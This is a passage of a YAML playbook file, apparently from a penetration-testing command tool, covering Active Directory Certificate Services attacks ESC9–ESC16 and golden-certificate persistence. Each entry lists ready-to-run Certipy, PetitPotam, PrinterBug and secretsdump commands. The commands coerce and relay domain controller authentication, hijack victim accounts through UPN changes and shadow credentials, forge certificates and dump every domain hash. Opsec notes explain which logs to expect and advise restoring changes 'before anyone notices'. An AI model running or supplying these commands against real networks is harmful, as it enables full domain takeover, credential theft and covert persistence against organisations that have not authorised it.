      - label: "Step 2c — Allow relay without auth (if unauthenticated PetitPotam works)"
        cmd: "python3 PetitPotam.py {ATTACKER_IP} {DC_IP}"
      - label: "Step 3 — Authenticate with obtained DC cert"
        cmd: "certipy auth -pfx 'dc.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — DCSync with DC machine hash"
        cmd: "impacket-secretsdump -hashes :{NTLM_HASH} '{DOMAIN}/DC$'@{DC_IP} -just-dc-ntlm"
    next:
      - Use DC machine hash for DCSync
      - Extract KRBTGT hash for golden ticket
    opsec: >
      Coercion is detectable. Relay leaves HTTP logs on CA IIS server.
      Use quickly in a dedicated test window.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f dc.pfx dc.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC9 — No Security Extension on Template
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc9
    name: ESC9 — No Security Extension on Template (CT_FLAG_NO_SECURITY_EXTENSION)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc9
      - certipy
      - no-sid-extension
      - upn-manipulation
    description: >
      ESC9: Template has CT_FLAG_NO_SECURITY_EXTENSION — no SID extension in
      issued certs. If attacker has GenericWrite over a victim account, manipulate
      victim UPN → enroll → revert → authenticate as DA. Requires DC in
      Compatibility mode (StrongCertificateBindingEnforcement=1). Combined with
      ESC6 bypasses Full Enforcement mode too.
    commands:
      - label: "Step 0 — Get target user SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Read victim account current UPN"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user victim read"
      - label: "Step 2 — Set victim UPN to target sAMAccountName"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn '{TARGET_USER}' -user victim update"
      - label: "Step 3 — Get victim creds via shadow credentials"
        cmd: "certipy shadow -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -account victim auto"
      - label: "Step 4 — Request cert as victim (no SID extension due to ESC9)"
        cmd: "export KRB5CCNAME=victim.ccache && certipy req -k -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}'"
      - label: "Step 5 — Restore victim UPN"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn 'victim@{DOMAIN}' -user victim update"
      - label: "Step 6 — Authenticate as target"
        cmd: "certipy auth -dc-ip {DC_IP} -pfx '{TARGET_USER}.pfx' -username '{TARGET_USER}' -domain '{DOMAIN}'"
      - label: "Step 6b — ESC6+ESC9 combined (Full Enforcement bypass)"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE'"
    next:
      - Restore victim UPN immediately after cert is obtained
      - DCSync with recovered hash
    opsec: >
      UPN change is an AD attribute modification (event 4738). Revert quickly.
    cleanup:
      - label: "Restore victim UPN"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn 'victim@{DOMAIN}' -user victim update"
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx victim.ccache *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC10 — Weak Schannel Certificate Mapping
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc10
    name: ESC10 — Weak Schannel Certificate Mapping (UPN Mapping via LDAPS)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc10
      - certipy
      - schannel
      - ldaps
      - upn-mapping
    description: >
      ESC10: Domain Controllers have CertificateMappingMethods with 0x4 bit
      set — UPN-based Schannel mapping enabled. Attacker with GenericWrite over
      a victim account manipulates UPN, enrolls cert, reverts, then uses cert
      for Schannel (LDAPS) auth as target. Even works against machine accounts
      (DC$) for LDAP shell access.
    commands:
      - label: "Step 0 — Get target SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Read victim account UPN"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user victim read"
      - label: "Step 2 — Set victim UPN to target (e.g. dc$@domain for machine)"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn '{TARGET_USER}@{DOMAIN}' -user victim update"
      - label: "Step 3 — Get victim creds via shadow credentials"
        cmd: "certipy shadow -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -account victim auto"
      - label: "Step 4 — Enroll cert as victim"
        cmd: "export KRB5CCNAME=victim.ccache && certipy req -k -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template 'User'"
      - label: "Step 5 — Restore victim UPN"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn 'victim@{DOMAIN}' -user victim update"
      - label: "Step 6 — Authenticate via Schannel (LDAPS shell)"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP} -ldap-shell"
      - label: "LDAP shell — set RBCD or read sensitive data"
        cmd: "# In ldap-shell: set_rbcd <target_computer> <attacker_computer>"
    next:
      - Use LDAP shell to set RBCD or read domain secrets
      - Restore victim UPN immediately
    opsec: >
      UPN change logged (4738). LDAPS connection visible in DC logs.
      Restore victim UPN before anyone notices.
    cleanup:
      - label: "Restore victim UPN"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn 'victim@{DOMAIN}' -user victim update"
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx victim.ccache *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC11 — NTLM Relay to CA RPC
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc11
    name: ESC11 — NTLM Relay to CA RPC Interface (No Encryption)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - ATTACKER_IP
    requires_priv: null
    tags:
      - adcs
      - esc11
      - certipy
      - relay
      - rpc
      - icpr
    description: >
      ESC11: CA does not enforce encryption (IF_ENFORCEENCRYPTICERTREQUEST flag
      not set) for RPC certificate requests. Coerce DC auth and relay directly
      to CA RPC interface instead of web enrollment. Works even if web enrollment
      is disabled. Requires Certipy relay with rpc:// scheme.
    commands:
      - label: "Step 0 — Check CA for ESC11"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -stdout | grep -A5 'Enforce Encryption'"
      - label: "Step 1 — Start Certipy RPC relay (terminal 1)"
        cmd: "certipy relay -target 'rpc://{CA_IP}' -ca '{CA_NAME}' -template 'DomainController'"
      - label: "Step 2 — Coerce DC auth via PetitPotam (terminal 2)"
        cmd: "python3 PetitPotam.py -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}"
      - label: "Step 2b — Coerce via PrinterBug"
        cmd: "python3 printerbug.py '{DOMAIN}/{USERNAME}:{PASSWORD}'@{DC_IP} {ATTACKER_IP}"
      - label: "Step 3 — Authenticate with obtained DC cert"
        cmd: "certipy auth -pfx 'dc.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — DCSync with DC hash"
        cmd: "impacket-secretsdump -hashes :{NTLM_HASH} '{DOMAIN}/DC$'@{DC_IP} -just-dc-ntlm"
    next:
      - Extract KRBTGT hash for golden ticket
      - DCSync all domain hashes
    opsec: >
      RPC relay is stealthier than web enrollment relay — less logging on CA.
      Coercion is still detectable on network.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f dc.pfx dc.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC13 — Issuance Policy Linked to Privileged Group
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc13
    name: ESC13 — Issuance Policy Linked to Privileged Group
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc13
      - certipy
      - issuance-policy
      - group-link
    description: >
      ESC13: Template has an Issuance Policy OID that is linked (via
      msDS-OIDToGroupLink) to a privileged AD group. Enrolling for this template
      results in a TGT that includes the linked group's SID — effectively granting
      group membership privileges without actually being a member. If linked group
      has DCSync rights, you can DCSync immediately.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Find ESC13 templates with OID group links"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout -oids | grep -A10 'ESC13'"
      - label: "Step 2 — Enroll for ESC13 template"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}'"
      - label: "Step 3 — Authenticate — TGT will include linked group SID"
        cmd: "certipy auth -pfx '{USERNAME}.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — Use TGT with linked group privileges"
        cmd: "export KRB5CCNAME={USERNAME}.ccache && impacket-secretsdump -k -no-pass {DOMAIN}/{USERNAME}@{DC_IP} -just-dc-ntlm"
    next:
      - Verify what privileges the linked group grants
      - Use TGT for DCSync if group has replication rights
    opsec: >
      Single cert enrollment (4886) and normal Kerberos auth. Low noise.
      TGT with extra group SID is anomalous but not always alerted.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f {USERNAME}.pfx {USERNAME}.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC14 — Weak Explicit Certificate Mapping (altSecurityIdentities)
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc14
    name: ESC14 — Weak Explicit Certificate Mapping (altSecurityIdentities)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc14
      - certipy
      - altsecurityidentities
      - explicit-mapping
    description: >
      ESC14: A privileged account has weak altSecurityIdentities entries mapping
      certificates by non-unique or easily spoofable fields (e.g., Subject CN only).
      If you can obtain a cert matching that criteria (from ESC1 or another vuln),
      you can authenticate as that privileged account.
    commands:
      - label: "Step 0 — Get target SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Find accounts with altSecurityIdentities set"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(altSecurityIdentities=*)' 'sAMAccountName altSecurityIdentities'"
      - label: "Read specific account altSecurityIdentities"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Attempt auth with matching cert (after obtaining it)"
        cmd: "certipy auth -dc-ip {DC_IP} -pfx 'matching_cert.pfx' -username '{TARGET_USER}' -domain '{DOMAIN}'"
      - label: "LDAP auth via Schannel with matching cert"
        cmd: "certipy auth -pfx 'matching_cert.pfx' -dc-ip {DC_IP} -ldap-shell"
    next:
      - Identify what certificate criteria the altSecurityIdentities entry uses
      - Obtain or forge a cert matching those criteria
    opsec: >
      Auth attempt logged at DC (4768/4624). Low noise if successful.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f matching_cert.pfx *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC15 — Application Policy Injection (CVE-2024-49019 / EKUwu)
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc15
    name: ESC15 — Application Policy Injection in V1 Templates (CVE-2024-49019)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc15
      - certipy
      - cve-2024-49019
      - ekuwu
      - v1-template
      - application-policy
    description: >
      ESC15 (EKUwu / CVE-2024-49019): Unpatched CA allows injecting arbitrary
      Application Policies into V1 template requests. Template with Enrollee
      Supplies Subject + Schema V1 — inject "Client Authentication" to authenticate
      as target, or inject "Certificate Request Agent" then chain as ESC3.
      Only works on CAs not patched with Nov 2024 updates.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Check for ESC15 vulnerable templates"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -stdout | grep -A10 'ESC15'"
      - label: "Method A — Inject Client Authentication policy → direct auth"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE' -application-policies 'Client Authentication'"
      - label: "Method A Step 2 — Authenticate via Schannel (LDAPS)"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP} -ldap-shell"
      - label: "Method B — Inject Certificate Request Agent policy (then chain ESC3)"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -application-policies 'Certificate Request Agent'"
      - label: "Method B Step 2 — Use injected agent cert to enroll on behalf of DA"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template 'User' -pfx '{USERNAME}.pfx' -on-behalf-of '{DOMAIN}\\{TARGET_USER}'"
      - label: "Method B Step 3 — Authenticate as DA"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
    next:
      - Use LDAP shell for RBCD or domain recon
      - DCSync with recovered DA hash
    opsec: >
      Cert enrollment logged (4886). Unpatched CA is legacy — requests may
      be less monitored. Verify CA patch level before attempting.
    cleanup:
      - label: "Remove cert files"
        cmd: "rm -f {USERNAME}.pfx {TARGET_USER}.pfx *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # ESC16 — Security Extension Disabled on CA Globally
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_esc16
    name: ESC16 — Security Extension Disabled on CA (Global — All Templates Affected)
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TEMPLATE
      - TARGET_USER
    requires_priv: null
    tags:
      - adcs
      - esc16
      - certipy
      - no-sid-extension
      - ca-global
      - upn-manipulation
    description: >
      ESC16: CA has OID 1.3.6.1.4.1.311.25.2 in DisableExtensionList — NO cert
      from this CA will ever include the SID security extension. Every template
      on this CA effectively has CT_FLAG_NO_SECURITY_EXTENSION. Exploit path is
      identical to ESC9 but you can use ANY client auth template. Combined with
      ESC6, bypasses Full Enforcement on fully patched DCs.
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Check CA for ESC16"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -stdout | grep -A5 'Disabled Extensions'"
      - label: "Method A — UPN manipulation (Compatibility Mode DCs)"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn '{TARGET_USER}' -user victim update"
      - label: "Method A Step 2 — Get victim creds via shadow"
        cmd: "certipy shadow -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -account victim auto"
      - label: "Method A Step 3 — Enroll any client auth template as victim"
        cmd: "export KRB5CCNAME=victim.ccache && certipy req -k -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}'"
      - label: "Method A Step 4 — Restore victim UPN immediately"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn 'victim@{DOMAIN}' -user victim update"
      - label: "Method A Step 5 — Authenticate as target"
        cmd: "certipy auth -dc-ip {DC_IP} -pfx '{TARGET_USER}.pfx' -username '{TARGET_USER}' -domain '{DOMAIN}'"
      - label: "Method B — ESC6+ESC16 combined (Full Enforcement bypass)"
        cmd: "certipy req -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -dc-ip {DC_IP} -target {CA_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE'"
      - label: "Method B Step 2 — Authenticate"
        cmd: "certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP}"
    next:
      - Restore victim UPN immediately after cert obtained
      - DCSync with recovered DA hash
    opsec: >
      UPN change logged (4738). Revert immediately after enrollment.
      The lack of SID extension in ALL certs from this CA is the key indicator.
    cleanup:
      - label: "Restore victim UPN"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -upn 'victim@{DOMAIN}' -user victim update"
      - label: "Remove cert files"
        cmd: "rm -f {TARGET_USER}.pfx victim.ccache *.ccache"

  # ══════════════════════════════════════════════════════════════════════════════
  # POST-COMPROMISE — CA Backup and Golden Certificate
  # ══════════════════════════════════════════════════════════════════════════════

  - id: certipy_ca_backup_golden
    name: Golden Certificate — CA Key Backup + Forge Any Cert
    tab: ADCS
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - CA_NAME
      - CA_IP
      - TARGET_USER
    requires_priv: da
    tags:
      - adcs
      - certipy
      - golden-cert
      - ca-backup
      - persistence
      - post-compromise
    description: >
      Post-DA-compromise: Back up the CA private key then forge certificates for
      any user forever — even after password resets. Survives KRBTGT rotation.
      The ultimate ADCS persistence technique. Requires ManageCA + ManageCertificates
      rights (DA has these by default).
    commands:
      - label: "Step 0 — Get administrator SID"
        cmd: "certipy account -u '{USERNAME}' -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} read"
      - label: "Step 1 — Back up CA private key"
        cmd: "certipy ca -u '{USERNAME}@{DOMAIN}' -p '{PASSWORD}' -ns {DC_IP} -target {CA_IP} -config '{CA_IP}\\{CA_NAME}' -backup"
      - label: "Step 2 — Forge certificate for any user"
        cmd: "certipy forge -ca-pfx '{CA_NAME}.pfx' -upn '{TARGET_USER}@{DOMAIN}' -sid 'S-1-5-21-DOMAIN-SID-HERE' -crl 'ldap:///'"
      - label: "Step 3 — Authenticate with forged cert"
        cmd: "certipy auth -pfx '{TARGET_USER}_forged.pfx' -dc-ip {DC_IP}"
      - label: "Step 4 — DCSync with recovered hash"
        cmd: "impacket-secretsdump {DOMAIN}/{TARGET_USER}@{DC_IP} -hashes :{NTLM_HASH} -just-dc-ntlm"
    next:
      - Document CA backup as critical finding for report
      - Store CA backup securely for engagement evidence
    opsec: >
      CA backup operation is logged. Golden certs bypass password changes but
      are detectable if CA has certificate transparency logging. Document for report.
    cleanup:
      - label: "Secure CA backup file"
        cmd: "chmod 600 {CA_NAME}.pfx && mv {CA_NAME}.pfx ~/loot/"
      - label: "Remove forged cert files"
        cmd: "rm -f {TARGET_USER}_forged.pfx *.ccache"
